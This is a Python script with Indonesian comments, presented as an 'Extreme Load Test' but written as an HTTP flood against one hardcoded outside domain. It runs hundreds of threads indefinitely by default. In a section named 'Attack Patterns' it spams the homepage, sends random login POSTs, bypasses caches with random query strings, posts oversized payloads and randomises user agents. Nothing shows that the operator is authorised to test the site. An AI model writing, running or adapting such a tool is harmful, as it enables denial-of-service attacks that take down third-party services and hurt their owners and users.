"""
Extreme Load Test - http://tridom.biz.id
Versi standalone - TIDAK perlu install locust/gevent

Cukup jalankan:
  python stress_test.py

Atau dengan argumen:
  python stress_test.py --users 500 --duration 0
  (duration 0 = jalan selamanya, Ctrl+C untuk stop)
"""

import threading
import requests
import random
import string
import time
import argparse
import sys
from datetime import datetime
from collections import defaultdict

# ─── Config ───────────────────────────────────────────────────────────────────
TARGET      = "http://tridom.biz.id"
NUM_USERS   = 300       # jumlah thread simultan
DURATION    = 0         # detik, 0 = selamanya
REPORT_EVERY = 10       # detik sekali print laporan

# ─── Stats ────────────────────────────────────────────────────────────────────
stats = defaultdict(int)
stats_lock = threading.Lock()
running = True

def rand_str(n=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

# ─── Attack Patterns ──────────────────────────────────────────────────────────
def worker():
    session = requests.Session()
    session.headers.update({
        "User-Agent": f"Mozilla/5.0 ({rand_str(6)}) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
    })

    endpoints_get = [
        "/", "/login", "/dashboard", "/admin", "/home",
        "/api", "/api/v1", "/api/v2", "/api/user", "/api/data",
        "/index.php", "/health", "/status", "/robots.txt",
    ]

    endpoints_post = [
        "/login", "/api/login", "/api/auth", "/api/v1/login",
    ]

    while running:
        try:
            action = random.randint(1, 6)

            if action <= 2:
                # GET homepage spam
                for _ in range(5):
                    if not running:
                        break
                    r = session.get(TARGET + "/", timeout=5)
                    with stats_lock:
                        stats["total"] += 1
                        stats[f"status_{r.status_code}"] += 1

            elif action == 3:
                # GET random endpoint
                ep = random.choice(endpoints_get)
                r = session.get(TARGET + ep, timeout=5)
                with stats_lock:
                    stats["total"] += 1
                    stats[f"status_{r.status_code}"] += 1

            elif action == 4:
                # POST dengan dummy payload
                ep = random.choice(endpoints_post)
                payload = {
                    "username": rand_str(),
                    "password": rand_str(12),
                    "token": rand_str(32),
                }
                r = session.post(TARGET + ep, json=payload, timeout=5)
                with stats_lock:
                    stats["total"] += 1
                    stats[f"status_{r.status_code}"] += 1

            elif action == 5:
                # Cache bypass dengan random query string
                params = f"?v={rand_str()}&t={rand_str()}&r={random.randint(1,99999)}"
                r = session.get(TARGET + params, timeout=5)
                with stats_lock:
                    stats["total"] += 1
                    stats[f"status_{r.status_code}"] += 1

            elif action == 6:
                # POST payload besar
                big_payload = {
                    "data": rand_str(2000),
                    "metadata": {f"key_{i}": rand_str(50) for i in range(20)},
                }
                r = session.post(TARGET + "/api/submit", json=big_payload, timeout=5)
                with stats_lock:
                    stats["total"] += 1
                    stats[f"status_{r.status_code}"] += 1

        except requests.exceptions.ConnectionError:
            with stats_lock:
                stats["total"] += 1
                stats["error_connection"] += 1
        except requests.exceptions.Timeout:
            with stats_lock:
                stats["total"] += 1
                stats["error_timeout"] += 1
        except Exception as e:
            with stats_lock:
                stats["total"] += 1
                stats["error_other"] += 1

        time.sleep(random.uniform(0.02, 0.15))


# ─── Reporter ─────────────────────────────────────────────────────────────────
def reporter(start_time):
    last_total = 0
    while running:
        time.sleep(REPORT_EVERY)
        if not running:
            break
        with stats_lock:
            total     = stats["total"]
            conn_err  = stats["error_connection"]
            timeout   = stats["error_timeout"]
            other_err = stats["error_other"]
            s200 = stats.get("status_200", 0)
            s404 = stats.get("status_404", 0)
            s500 = stats.get("status_500", 0)
            s503 = stats.get("status_503", 0)

        elapsed = time.time() - start_time
        rps = (total - last_total) / REPORT_EVERY
        last_total = total

        print(f"\n[{datetime.now().strftime('%H:%M:%S')}] "
              f"Elapsed: {int(elapsed)}s | "
              f"Total Req: {total} | "
              f"~{rps:.0f} req/s")
        print(f"  200 OK: {s200} | "
              f"404: {s404} | "
              f"500: {s500} | "
              f"503: {s503} | "
              f"Timeout: {timeout} | "
              f"ConnErr: {conn_err}")


# ─── Main ─────────────────────────────────────────────────────────────────────
def main():
    global running, NUM_USERS, DURATION

    parser = argparse.ArgumentParser(description="Stress Test Tool")
    parser.add_argument("--users",    type=int, default=NUM_USERS,  help="Jumlah thread (default: 300)")
    parser.add_argument("--duration", type=int, default=DURATION,   help="Durasi detik, 0=selamanya (default: 0)")
    args = parser.parse_args()

    NUM_USERS = args.users
    DURATION  = args.duration

    print("=" * 55)
    print(f"  TARGET   : {TARGET}")
    print(f"  THREADS  : {NUM_USERS}")
    print(f"  DURATION : {'Selamanya (Ctrl+C untuk stop)' if DURATION == 0 else f'{DURATION} detik'}")
    print("=" * 55)
    print("Memulai...")

    threads = []
    start_time = time.time()

    # Spawn workers
    for _ in range(NUM_USERS):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        threads.append(t)
        time.sleep(0.01)  # spawn pelan-pelan supaya tidak spike

    # Spawn reporter
    r = threading.Thread(target=reporter, args=(start_time,), daemon=True)
    r.start()

    print(f"[OK] {NUM_USERS} threads berjalan. Tekan Ctrl+C untuk stop.\n")

    try:
        if DURATION > 0:
            time.sleep(DURATION)
        else:
            while True:
                time.sleep(1)
    except KeyboardInterrupt:
        pass

    running = False
    elapsed = time.time() - start_time
    print(f"\n\n[STOP] Total: {stats['total']} requests dalam {int(elapsed)}s "
          f"(~{stats['total']//max(int(elapsed),1)} req/s rata-rata)")
    print("Done.")


if __name__ == "__main__":
    main()
